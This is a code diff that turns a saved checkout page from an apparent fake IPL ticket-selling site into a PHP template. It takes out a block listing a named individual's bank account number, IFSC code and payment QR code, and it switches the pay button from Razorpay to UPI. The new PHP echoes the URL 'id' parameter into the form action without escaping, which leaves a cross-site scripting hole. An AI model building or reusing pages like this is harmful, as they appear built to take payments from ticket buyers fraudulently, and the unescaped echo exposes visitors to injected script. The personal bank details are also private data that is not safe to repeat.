@@ -1,12 +1,19 @@
+<?php
+if (isset($_GET['id'])) {
+    $match_id = $_GET['id'];
+} else {
+}
+
+include('inctic.php');
+?>
 <!-- saved from url=(0055)https://cheap.get-ipl-ticket-seller.com/order.php?id=53 -->
 <html lang="en"><head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
     
     <link rel="icon" type="image/svg+xml" href="https://cheap.get-ipl-ticket-seller.com/vite.svg">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>Vite + React</title>
-    <script src="./checkout_files/661642293008712" async=""></script><script async="" src="./checkout_files/fbevents.js.download"></script><script type="module" src="./checkout_files/index-ck3X7H0s.js.download"></script>
-    <link rel="stylesheet" href="./checkout_files/index-DOFwVbkK.css">
-
+    <script src="./checkout_files/661642293008712" async=""></script><script async="" src="./checkout_files/fbevents.js.download"></script>
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
 <!-- Meta Pixel Code -->
 <script>
 !function(f,b,e,v,n,t,s)
@@ -100,8 +107,8 @@ src="https://www.facebook.com/tr?id=661642293008712&ev=PageView&noscript=1"
                     <div class="w-full lg:w-3/5">
 
 
-
-                        <form action="https://cheap.get-ipl-ticket-seller.com/payment.php?id=53" method="post">
+ 
+                        <form action="payment.php?id=<?php echo $match_id; ?>" method="post">
                             <div class="bg-white rounded-xl shadow-lg p-6 mb-6 relative overflow-hidden">
                                 <div class="absolute top-0 right-0 w-24 h-24">
                                     <div class="absolute transform rotate-45 bg-red-600 text-white text-xs font-bold py-1 right-[-35px] top-[32px] w-[170px] text-center">BOOKING DETAILS</div>
@@ -257,57 +264,7 @@ src="https://www.facebook.com/tr?id=661642293008712&ev=PageView&noscript=1"
                                 </div>
  
 
-                                <div class="container my-5">
-    <!-- Bank Account Card -->
-    <div class="card bg-white rounded-xl shadow-lg p-6 mb-6">
-        <div class="bg-gradient-to-r from-gray-50 to-white p-4 rounded-lg border border-gray-100 mb-4 text-xl font-bold heading-font flex items-center text-gray-800">
-            <h3 class="mb-0">Bank Account Details</h3>
-        </div>
-
-        <div class="card-body">
-    <div class="row">
-        <!-- Account Holder Name -->
-        <div class="col-md-3 mb-3">
-            <label class="form-label fw-bold">Account Holder Name:</label>
-            <div class="text-dark">Mr. Mithun Kumar</div>
-        </div>
-
-        <!-- Account Number -->
-        <div class="col-md-3 mb-3">
-            <label class="form-label fw-bold">Account Number:</label>
-            <div class="text-dark">728210110016145</div>
-        </div>
-    </div>
-
-    <div class="row">
-        <!-- IFSC Code -->
-        <div class="col-md-3 mb-3">
-            <label class="form-label fw-bold">IFSC Code:</label>
-            <div class="text-dark">BKID0007282</div>
-        </div>
-
-        <!-- Bank Name -->
-        <div class="col-md-3 mb-3">
-            <label class="form-label fw-bold">Bank Name:</label>
-            <div class="text-dark">Bank of India</div>
-        </div>
-    </div>
-</div>
-
-    </div>
-
-    <!-- QR Code Card -->
-    <div class="card bg-white rounded-xl shadow-lg p-6 mb-6">
-        <div class="bg-gradient-to-r from-gray-50 to-white p-4 rounded-lg border border-gray-100 mb-4 text-xl font-bold heading-font flex items-center text-gray-800">
-            <h3 class="mb-0">Scan to Pay</h3>
-        </div>
-
-        <div class="card-body text-center">
-            <img src="qrcode.jpeg" alt="QR Code" class="img-fluid rounded-3" style="max-width: 200px;">
-            <p class="text-muted mt-3">Scan the QR code for quick payment.</p>
-        </div>
-    </div>
-</div>
+                  
 
 
 
@@ -318,13 +275,10 @@ src="https://www.facebook.com/tr?id=661642293008712&ev=PageView&noscript=1"
 
 
 
-
-
-<!-- 
-                                <button id="main-payment-button" type="submit" class="w-full bg-gradient-to-r from-blue-600 to-blue-800 hover:from-blue-700 hover:to-blue-900 text-white py-3 px-4 rounded-md transition-colors flex items-center justify-center">
+           <button id="main-payment-button" type="submit" class="w-full bg-gradient-to-r from-blue-600 to-blue-800 hover:from-blue-700 hover:to-blue-900 text-white py-3 px-4 rounded-md transition-colors flex items-center justify-center">
                                     <i class="fa-solid fa-lock mr-2"></i>
-                                    <span id="pay-button-text">Pay with Razorpay ₹781.82</span>
-                                </button> -->
+                                    <span id="pay-button-text">Pay with UPI ₹781.82</span>
+                                </button>  
 
 
 
@@ -342,7 +296,7 @@ src="https://www.facebook.com/tr?id=661642293008712&ev=PageView&noscript=1"
                                         const totalAmount = baseAmount + gstAmount + serviceFee;
 
 
-                                        document.getElementById("pay-button-text").textContent = `Pay with Razorpay ₹${totalAmount.toLocaleString("en-IN")}`;
+                                        document.getElementById("pay-button-text").textContent = `Pay with UPI ₹${totalAmount.toLocaleString("en-IN")}`;
                                     });
                                 </script>
 
